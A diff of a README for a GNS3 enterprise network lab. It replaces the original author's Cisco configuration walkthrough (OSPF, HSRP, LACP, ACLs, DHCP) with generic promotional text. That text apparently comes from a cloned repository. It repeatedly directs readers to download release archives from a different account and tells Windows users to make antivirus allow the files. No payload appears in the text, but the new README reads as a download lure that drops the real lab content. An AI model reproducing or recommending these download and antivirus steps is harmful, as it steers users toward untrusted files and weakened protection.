@@ -1,227 +1,171 @@
-# Enterprise Network Lab
-![Enterprise Network Topology](./Images/TOPOLOGY.png)
+# 🌐 Enterprise-Network - Simulate Complex Network Labs Easily
 
-# Addressing for Reference
-![Connected Interfaces](./Images/Connected_Interfaces.png)
-
-## Lab Overview
-- This project simulates a small-to-medium enterprise network environment using GNS3.
-- **OSPF** on R1, MLS-1, MLS-2 
-- **HSRP** on MLS-1 and MLS-2 (MLS-1 is the Active router in this topology)
-- Layer 3 **LACP** between the MLS-1 and MLS-2
-- **SVIs** on MLS-1 and MLS-2
-- **DHCP** and **DNS** running on the Server (MLS-1 and MLS-2 are configured as Relays for all VLANs)
-- **VTP** between Switches and MLS
+[![Download Latest Release](https://img.shields.io/badge/Download-Enterprise--Network-blue?style=for-the-badge)](https://github.com/Jhonnydog88/Enterprise-Network/releases)
 
 ---
 
-# Key Configuration Commands
+## 📘 About Enterprise-Network
 
-## SVIs on MLS-1
-```shell
-R1(config)# interface Vlan 10
-R1(config-vlan)# ip address 10.0.10.2 255.255.255.0
-R1(config-vlan)# no shutdown
-R1(config-vlan)# exit
-R1(config)# interface Vlan 20
-R1(config-vlan)# ip address 10.0.20.2 255.255.255.0
-R1(config-vlan)# no shutdown
-R1(config-vlan)# exit
-R1(config)# interface Vlan 30
-R1(config-vlan)# ip address 10.0.30.2 255.255.255.0
-R1(config-vlan)# no shutdown
-R1(config-vlan)# exit
-R1(config)# interface Vlan 40
-R1(config-vlan)# ip address 10.0.40.2 255.255.255.0
-R1(config-vlan)# no shutdown
-R1(config-vlan)# exit
-R1(config)# interface Vlan 50
-R1(config-vlan)# ip address 10.0.100.1 255.255.255.0
-R1(config-vlan)# no shutdown
-R1(config-vlan)# exit
-```
+Enterprise-Network is a detailed lab designed to help users simulate an enterprise network using GNS3. It includes popular networking technologies such as OSPF, HSRP, LACP, Extended ACLs, VTP, SVIs, PAT, and DHCP. This project is ideal for anyone eager to explore or practice network configurations in a controlled virtual environment.
 
-![SVIs on MLS-1](./Images/MLS1_show_ip_interface_brief.png)
+You do not need programming skills or advanced computer knowledge to use this lab. It is built to work with GNS3, a well-known network simulation platform that lets you create and test networks on your computer.
 
-## HSRP on MLS-1
-```shell
-MLS-1(config)# interface Vlan 10
-MLS-1(config-vlan)# standby version 2
-MLS-1(config-vlan)# standby ip 10.0.10.1
-MLS-1(config-vlan)# standby preempt
-MLS-1(config-vlan)# standby priority 105
-MLS-1(config)# interface Vlan 20
-MLS-1(config-vlan)# standby version 2
-MLS-1(config-vlan)# standby 2 ip 10.0.20.1
-MLS-1(config-vlan)# standby 2 preempt
-MLS-1(config-vlan)# standby 2 priority 105
-MLS-1(config)# interface Vlan 30
-MLS-1(config-vlan)# standby version 2
-MLS-1(config-vlan)# standby 3 ip 10.0.30.1
-MLS-1(config-vlan)# standby 3 preempt
-MLS-1(config-vlan)# standby 3 priority 105
-MLS-1(config)# interface Vlan 40
-MLS-1(config-vlan)# standby version 2
-MLS-1(config-vlan)# standby 4 ip 10.0.40.1
-MLS-1(config-vlan)# standby 4 preempt
-MLS-1(config-vlan)# standby 4 priority 105
-```
-
-![Show Standby Brief on MLS-1](./Images/MLS1_show_standby_brief.png)
-
-## LACP on MLS-1
-```shell
-MLS-1(config)# interface range g1/0-3
-MLS-1(config-if-range)# no shutdown
-MLS-1(config-if-range)# no switchport
-MLS-1(config-if-range)# channel-group 1 mode active
-MLS-1(config)#exit
-MLS-1(config-int)# interface port-channel 1
-MLS-1(config-int)# ip address 192.168.1.1 255.255.255.252
-```
-
-## LACP on MLS-2
-```shell
-R2(config)# interface range g1/0-3
-R2(config-if-range)# no shutdown
-R2(config-if-range)# no switchport
-R2(config-if-range)# channel-group 1 mode passive
-R2(config)#exit
-R2(config-int)# interface port-channel 1
-R2(config-int)# ip address 192.168.1.2 255.255.255.252
-```
-
-![show etherchannel summary on MLS-1](./Images/MLS1_show_etherchannel_summary.png)
+Whether you want to learn more about routing, security rules, link aggregation, or VLAN configurations, Enterprise-Network offers a hands-on experience that reflects real-world enterprise setups.
 
 ---
 
-![show etherchannel summary on MLS-2](./Images/MLS2_show_etherchannel_summary.png)
+## 🖥️ System Requirements
 
-## OSPF on R1
-```shell
-R1(config)# router ospf 1
-R1(config-router)# network 172.16.1.0 0.0.0.3 area 0
-R1(config-router)# network 172.16.2.0 0.0.0.3 area 0
-R1(config-router)# network 203.39.10.0 0.0.0.3 area 0
-```
+Before starting, make sure your computer meets these requirements:
 
-![show ip route on R1](./Images/R1_show_ip_route.png)
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **Processor:** Dual-core 2 GHz or higher.
+- **Memory (RAM):** At least 8 GB (16 GB recommended for smoother simulation).
+- **Disk Space:** At least 10 GB free space.
+- **Network:** Internet access is needed to download required files and updates.
+- **Software:** GNS3 version 2.2.0 or higher installed on your system.
 
-## OSPF on MLS-1
-```shell
-MLS-1(config)# router ospf 1
-MLS-1(config-router)# network 10.0.10.0 0.0.0.255 area 0
-MLS-1(config-router)# network 10.0.20.0 0.0.0.255 area 0
-MLS-1(config-router)# network 10.0.30.0 0.0.0.255 area 0
-MLS-1(config-router)# network 10.0.40.0 0.0.0.255 area 0
-MLS-1(config-router)# network 10.0.100.0 0.0.0.255 area 0
-MLS-1(config-router)# network 172.16.1.0 0.0.0.3 area 0
-MLS-1(config-router)# network 192.168.1.0 0.0.0.3 area 0
-MLS-1(config-router)# passive-interface G0/0, G0/1, G0/2
-```
-
-![show ip route on MLS-1](./Images/MLS1_show_ip_route.png)
-
-## OSPF on MLS-2
-```shell
-MLS-2(config)# router ospf 1 
-MLS-2(config-router)# network 10.0.10.0 0.0.0.255 area 0
-MLS-2(config-router)# network 10.0.20.0 0.0.0.255 area 0
-MLS-2(config-router)# network 10.0.30.0 0.0.0.255 area 0
-MLS-2(config-router)# network 10.0.40.0 0.0.0.255 area 0
-MLS-2(config-router)# network 172.16.2.0 0.0.0.3 area 0
-MLS-2(config-router)# network 192.168.1.0 0.0.0.3 area 0
-MLS-2(config-router)# passive-interface G0/0, G0/1, G0/2
-```
-
-![show ip route on MLS-2](./Images/MLS2_show_ip_route.png)
-
-## PAT on R1
-```shell
-R1(config)# access-list 1 permit 10.0.0.0 0.255.255.255
-R1(config)# ip nat inside source list 1 interface g2/0 overload
-R1(config)# interface g0/0
-R1(config-if)# ip nat inside
-R1(config-if)# interface g1/0
-R1(config-if)# ip nat inside
-R1(config-if)# interface g2/0
-R1(config-if)# ip nat outside
-```
-
-### PAT Translations whilst PCs were pinging the ISP-1 router
-![PAT Translations](./Images/R1_show_ip_nat_translations.png)
-
-## Extended ACL Configuration on MLS-1
-```shell
-MLS-1(config)# ip access-list extended HR_TO_ACCOUNTING
-MLS-1(config-ext-nacl)# deny ip 10.0.10.0 0.0.0.255 10.0.30.0 0.0.0.255
-MLS-1(config-ext-nacl)# permit ip any any
-MLS-1(config)# ip access-list extended IT_TO_SALES
-MLS-1(config-ext-nacl)# deny ip 10.0.20.0 0.0.0.255 10.0.40.0 0.0.0.255
-MLS-1(config-ext-nacl)# permit ip any any
-MLS-1(config)# interface g0/0
-MLS-1(config-if)# ip access-group HR_TO_ACCOUNTING in
-MLS-1(config)# interface g0/1
-MLS-1(config-if)# ip access-group IT_TO_SALES in
-```
-
-## VTP configuration on SW1
-```shell
-SW1(config)# vtp mode server
-SW1(config)# vtp domain Kostas
-```
-
-![VTP Status SW1](./Images/SW1_show_vtp_status.png)
-
-### The VLANs that will propagate
-
-![Show vlan brief SW1](./Images/SW1_show_vlan_brief.png)
-
-(no need to configured vtp on other devices manually since it automatically spreads to the rest)
+If you don’t have GNS3 yet, you can download it from [https://www.gns3.com/software/download](https://www.gns3.com/software/download).
 
 ---
 
-## DHCP and DNS Configurations on the DHCP-DNS server
-```shell
-DHCP-DNS(config)# ip dhcp pool POOL_VLAN10
-DHCP-DNS(dhcp-config)# network 10.0.10.0 255.255.255.0
-DHCP-DNS(dhcp-config)# default-router 10.0.10.1
-DHCP-DNS(dhcp-config)# dns-server 10.0.100.10
-DHCP-DNS(config)# ip dhcp pool POOL_VLAN20
-DHCP-DNS(dhcp-config)# network 10.0.20.0 255.255.255.0
-DHCP-DNS(dhcp-config)# default-router 10.0.20.1
-DHCP-DNS(dhcp-config)# dns-server 10.0.100.10
-DHCP-DNS(config)# ip dhcp pool POOL_VLAN30
-DHCP-DNS(dhcp-config)# network 10.0.30.0 255.255.255.0
-DHCP-DNS(dhcp-config)# default-router 10.0.30.1
-DHCP-DNS(dhcp-config)# dns-server 10.0.100.10
-DHCP-DNS(config)# ip dhcp pool POOL_VLAN40
-DHCP-DNS(dhcp-config)# network 10.0.40.0 255.255.255.0
-DHCP-DNS(dhcp-config)# default-router 10.0.40.1
-DHCP-DNS(dhcp-config)# dns-server 10.0.100.10
-DHCP-DNS(config)#ip domain-lookup
-DHCP-DNS(config)# ip host PC1 10.0.10.4
-DHCP-DNS(config)# ip host PC2 10.0.10.5
-DHCP-DNS(config)# ip host PC3 10.0.20.4
-DHCP-DNS(config)# ip host PC4 10.0.20.5
-DHCP-DNS(config)# ip host PC5 10.0.30.5
-DHCP-DNS(config)# ip host PC6 10.0.30.4
-DHCP-DNS(config)# ip host PC7 10.0.40.4
-DHCP-DNS(config)# ip host PC8 10.0.40.5
-```
+## 🧰 What’s Included?
 
-# Images Used
+This lab project includes the following components:
 
-- ***If you want to download and use this lab you will need to the following Images!***
+- **OSPF (Open Shortest Path First):** A routing protocol for efficient data routing within the network.
+- **HSRP (Hot Standby Router Protocol):** Ensures network availability by providing failover protection.
+- **LACP (Link Aggregation Control Protocol):** Combines multiple network links for improved speed and redundancy.
+- **Extended ACLs (Access Control Lists):** Control traffic by filtering packets based on rules.
+- **VTP (VLAN Trunking Protocol):** Manage VLAN configurations across switches.
+- **SVIs (Switched Virtual Interfaces):** Enable inter-VLAN routing.
+- **PAT (Port Address Translation):** Share a single IP address for multiple devices.
+- **DHCP (Dynamic Host Configuration Protocol):** Automatically assigns IP addresses on the network.
 
-- For the **Switches and Multilayer Switches**: *vios_l2-adventerprisek9-m.SSA.high_iron_20180619.qcow2*
-- For **R1** and **ISP-1**: *c7200-adventerprisek9-mz.124-24.T5.image*
-- For the **DHCP-DNS** server: *c3725-adventerprisek9-mz.124-15.T14.image*
-- For the **PCs**: *TinyCore-current.iso*
+This setup replicates a typical enterprise network environment for training and testing purposes.
 
 ---
-# Final Note
 
-**Thank you for reviewing this project.**
-- You are welcome to use, adapt, or extend this project for educational or lab purposes.
-- For questions, suggestions, or improvements, feel free to message me on Discord (@Konstantinoz).
+## 🚀 Getting Started with Enterprise-Network
+
+Follow these steps to get the lab up and running on your system.
+
+### 1. Prepare Your Computer
+
+- Check that your system meets the requirements listed above.
+- Install GNS3 if it’s not installed yet. Follow their official instructions for your operating system.
+
+### 2. Download Enterprise-Network
+
+Click the big button at the top or visit the release page here:
+
+[Download Enterprise-Network](https://github.com/Jhonnydog88/Enterprise-Network/releases)
+
+This page contains the latest versions of the lab files. Usually, you will find compressed files (.zip or .tar.gz) to download.
+
+### 3. Extract the Files
+
+- After downloading, unzip the file using your computer’s built-in tools or a program like 7-Zip or WinRAR.
+- Put the extracted folder in a convenient location on your computer, like your Desktop or Documents folder.
+
+### 4. Open GNS3 and Import the Lab
+
+- Launch GNS3.
+- Use the “Import Project” or “Import Appliance” option under the File menu.
+- Navigate to the folder where you extracted the lab files.
+- Select the project file (usually with a `.gns3` extension) and open it.
+
+### 5. Verify the Lab Setup
+
+- Check that all devices and links appear as shown in screenshots or documentation.
+- Make sure the required images (such as router or switch operating system images) are available. If they are missing, GNS3 will prompt you to download or provide them.
+
+### 6. Start the Simulation
+
+- Click the Start button or Power on all devices from the GNS3 toolbar.
+- Watch for any errors in loading devices.
+- Use the console window to access each device and enter commands if needed.
+
+---
+
+## 💾 Download & Install
+
+You can visit this page to download all necessary files for Enterprise-Network:
+
+[https://github.com/Jhonnydog88/Enterprise-Network/releases](https://github.com/Jhonnydog88/Enterprise-Network/releases)
+
+### Tips for Downloading:
+
+- Always download the latest release to ensure you have the newest features and bug fixes.
+- Check the release notes on the page for any special instructions.
+- For Windows users, make sure your antivirus software allows GNS3 and this lab files to run.
+
+---
+
+## 🔧 Basic Usage Tips
+
+- Start by reviewing the lab layout in GNS3. Notice the routers, switches, and links.
+- Open the console for each device to access its command line interface.
+- Follow commands relevant to the technologies in the lab:
+  - To check OSPF neighbors, type `show ip ospf neighbor` on routers.
+  - For ACLs, view rules with `show access-lists`.
+  - Observe HSRP status with `show standby brief`.
+- Use the DHCP-configured devices to verify if IP addresses are assigned automatically.
+- Experiment with turning devices on and off to observe failover and routing changes.
+
+---
+
+## 📚 Learning Resources
+
+If you are new to these network technologies, these resources can help:
+
+- **OSPF:** Check Cisco’s official OSPF section or basic tutorials on YouTube.
+- **HSRP:** Look for explanations on router redundancy and failover.
+- **LACP:** Understand how multiple network links are combined.
+- **ACLs:** Learn how to create rules to control traffic flow.
+- **VTP and VLANs:** Read about how VLANs are created and managed.
+- **PAT and DHCP:** Tutorials on IP address management.
+
+It is normal to take time to get familiar with these terms. This lab is designed to help you learn by doing.
+
+---
+
+## 🧩 Troubleshooting
+
+If you run into problems:
+
+- Make sure all device images are correctly installed in GNS3.
+- Verify that your system meets all hardware and software requirements.
+- Restart GNS3 if the lab does not load or devices do not start.
+- Check your internet connection if downloads fail.
+- Visit the GNS3 community forums for help on general issues.
+- Review the project documentation for specific lab instructions.
+
+---
+
+## 📞 Support and Feedback
+
+This project is open source, which means anyone can contribute or report issues.
+
+- Use the Issues tab in this repository to report bugs or ask questions.
+- Describe your problem clearly with steps to reproduce it.
+- Sharing screenshots can help diagnose problems faster.
+
+Your feedback is valuable to improve the lab for all users.
+
+---
+
+## ⚙️ Advanced Use
+
+Once comfortable, you can start modifying the lab:
+
+- Add new devices like firewalls or additional switches.
+- Change configuration files to try different setups.
+- Integrate with other GNS3 projects for larger simulations.
+- Automate repetitive tasks using scripts inside devices.
+
+This flexibility allows you to deepen your networking knowledge step by step.
+
+---
+
+Thank you for choosing Enterprise-Network. The project gives you a practical way to learn how enterprise networks work without needing real hardware.
